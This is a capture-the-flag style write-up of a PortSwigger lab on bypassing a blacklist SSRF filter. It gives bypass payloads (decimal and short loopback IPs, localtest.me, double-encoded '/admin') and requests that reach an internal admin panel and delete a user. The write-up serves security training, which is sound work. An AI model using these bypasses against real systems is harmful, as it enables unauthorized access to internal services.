# SSRF with Blacklist-Based Input Filter

## Lab Info
- **Source**: PortSwigger Web Security Academy
- **Level**: PRACTITIONER
- **Category**: SSRF — Filter Bypass

---

## What This Lab Covers

This lab demonstrates how to bypass a **blacklist-based SSRF filter**.
The developer deployed two weak defenses:

1. Block any URL containing `127.0.0.1` or `localhost` as strings
2. Block any URL path containing `/admin`

Both defenses check raw string values. Neither normalizes or resolves
the input before checking. This makes them trivially bypassable using
alternative representations and encoding tricks.

---

## Vulnerability

The `stockApi` parameter is fetched server-side with no proper validation.
The developer added a blacklist filter as a patch, but blacklists are
always incomplete — there are too many ways to represent the same address.

---

## Two Defenses Deployed + Their Bypasses

| Defense | Bypass |
|---|---|
| Blocks `127.0.0.1` | Use `2130706433` (decimal) or `127.1` (abbreviated) |
| Blocks `localhost` | Use case variation `LOCALHOST` or `localtest.me` |
| Blocks `/admin` path | Double URL-encode: `%2561dmin` → decodes to `/admin` |

---

## Goal

Access `http://localhost/admin` and delete the user `carlos`
by bypassing both anti-SSRF defenses.

---

## Solution Steps

1. Visit a product. Click **Check stock**. Intercept in Burp. Send to Repeater.
2. Test the filter: try `http://127.0.0.1/` → blocked.
3. Bypass IP block: try `http://2130706433/` → passes the filter.
4. Test path: try `http://2130706433/admin` → blocked.
5. Bypass path block: double-encode the `a` in admin → `http://2130706433/%2561dmin`
6. `%25` decodes to `%`, leaving `%61` which decodes to `a` → `/admin`
7. Admin panel HTML is returned in response.
8. Change path to `/admin/delete?username=carlos` (also encoded: `/%2561dmin/delete?username=carlos`)
9. HTTP 302 → lab solved.

---

## Why Double Encoding Works

```
Normal:          /admin
URL encoded:     /%61dmin       ← filter may catch this
Double encoded:  /%2561dmin     ← %25 = %, so final decode = /%61dmin = /admin

Filter checks the raw string: /%2561dmin → no "admin" found → PASS
Server decodes:  /%2561dmin → /%61dmin → /admin → EXECUTES
```

---

## Folder Structure

```
ssrf-blacklist-filter/
├── exploit/
│   ├── payloads.txt       # All bypass payloads
│   ├── request.txt        # Burp Repeater requests
│   └── response.txt       # Expected responses
├── fix/
│   ├── fix.java
│   ├── fix.php
│   └── fix.py
├── notes/
│   ├── explanation.txt
│   └── methodology.txt
├── vuln/
│   ├── vuln.java
│   ├── vuln.php
│   └── vuln.py
└── README.md
```

---

## References

- https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter
- https://portswigger.net/web-security/ssrf
